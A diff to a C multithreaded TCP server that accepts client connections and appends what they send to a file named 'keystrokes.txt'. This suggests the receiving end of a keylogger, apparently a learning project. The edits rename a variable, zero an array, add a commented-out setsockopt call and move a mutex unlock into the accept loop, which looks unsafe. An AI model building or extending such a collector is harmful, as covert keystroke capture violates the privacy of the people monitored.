@@ -4,7 +4,6 @@
 
 #include "utils.h"
 #include <arpa/inet.h>
-#include <bits/pthreadtypes.h>
 #include <errno.h>
 #include <netinet/in.h>
 #include <pthread.h>
@@ -82,6 +81,8 @@ int main(int argc, char *argv[])
     server_addr.sin_port = htons(port);
     server_addr.sin_addr.s_addr = INADDR_ANY;
 
+    // setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR,);
+
     // Bind the socket to the server address.
     if (bind(server_sock, (struct sockaddr *)&server_addr, server_addr_len) < 0)
     {
@@ -100,20 +101,23 @@ int main(int argc, char *argv[])
     // Accept incoming client connection.
     struct sockaddr_in client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
-    int client_sock, pthread;
+    int client_sock, threadId;
     pthread_t client_thread;
     
     // Initialize number of clients online to 0.
     pthread_mutex_lock(&mutexFD);
     numOfClients = 0;
 
+    // Zero out the client_sockets array.
+    memset(client_sockets, 0, sizeof(client_sockets));
+
     // Open file for writing.
     file_D = open("keystrokes.txt", O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
-    pthread_mutex_unlock(&mutexFD);
 
     while (numOfClients < MAX_CLIENTS)
     {
 
+        pthread_mutex_unlock(&mutexFD);
         client_sock = accept(server_sock, (struct sockaddr *)&client_addr,
                              &client_addr_len);
         if (client_sock < 0)
@@ -157,9 +161,9 @@ int main(int argc, char *argv[])
         client_args->client_socket = client_sock;
 
         // Create a new thread for the new client.
-        pthread = pthread_create(&client_thread, NULL, handle_client,
+        threadId = pthread_create(&client_thread, NULL, handle_client,
                                  (void *)client_args);
-        if (pthread != 0)
+        if (threadId != 0)
         {
             fprintf(stderr, "[x] Pthread Create! [FAILED]\n");
             free(client_args);
